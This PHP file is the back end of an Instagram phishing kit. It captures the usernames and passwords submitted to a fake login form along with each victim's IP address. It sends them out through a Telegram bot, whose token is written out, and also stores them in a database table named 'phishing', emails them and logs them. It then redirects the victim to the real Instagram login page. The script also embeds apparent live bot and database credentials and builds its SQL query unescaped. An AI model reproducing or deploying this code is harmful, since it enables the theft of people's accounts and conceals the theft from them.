<?php

require 'php_mail.php';

$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER[REMOTE_ADDR];
// $waktu = date("l jS \of F Y h:i:s A");
$waktu = date("j/m/Y || H:i:s ");

// var_dump($_POST);
// print_r($_POST);

?>




<!-- ==================================== TELEGRAM -->

<?php
$apiToken = "795879834:AAEh99eFQIJLHQ2OpV3J_QcQ89vyXT7Wv9o";

$data = [
    'chat_id' => '-1001431066193',
    'text' => "$waktu\nIP \t=> $ip\nUsername \t=> $username\nPassword \t=> $password"
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
// Do what you want with result
?>






<!-- ==================================== DATABASE -->

<?php  
	$servername = 'localhost';
	$userDB = 'ICall';
	$passDB = 'rizal123';
	$dbname = 'UAS';


	// create conneciion
	$conn = mysqli_connect($servername, $userDB, $passDB, $dbname);

	if (!$conn) {
		die("Connection Failed : ".mysqli_connect_error());
	}
	

	$sql = "INSERT INTO phishing (username, password, ip) VALUES ('$username','$password','$ip')";

	if (mysqli_query($conn, $sql)) {
		echo "Insert Values Created Successfully";
	}else{
		echo "Error to Insert Values: ".mysqli_error($conn);
	}

	mysqli_close($conn);
?>



<!-- ==================================== EMAIL -->

<?php 
	$mail->isHTML(true); 
	$mail->Subject = 'Laporan Insta Phising';
    $mail->Body    = "$waktu<br>IP : $ip<br>Username : $username<br>Password : $password";
    $mail->send();
    echo 'Message has been sent';
?>




<!-- ==================================== LOG -->

<?php

$handle = fopen("./logs.txt", "a+");
        fwrite($handle, "== ".$waktu." ==\n");
        fwrite($handle, "From IP : $ip\n");

foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\n\r");
}
fwrite($handle, "== Sending To Email, DB, Telegram, Log : SUCCESS ==\n");
fwrite($handle, "\r\n");
fclose($handle);
?>


<!-- ==================================== REDIRECT -->

<?php  
header ('Location:https://www.instagram.com/accounts/login/?source=auth_switcher');
?>
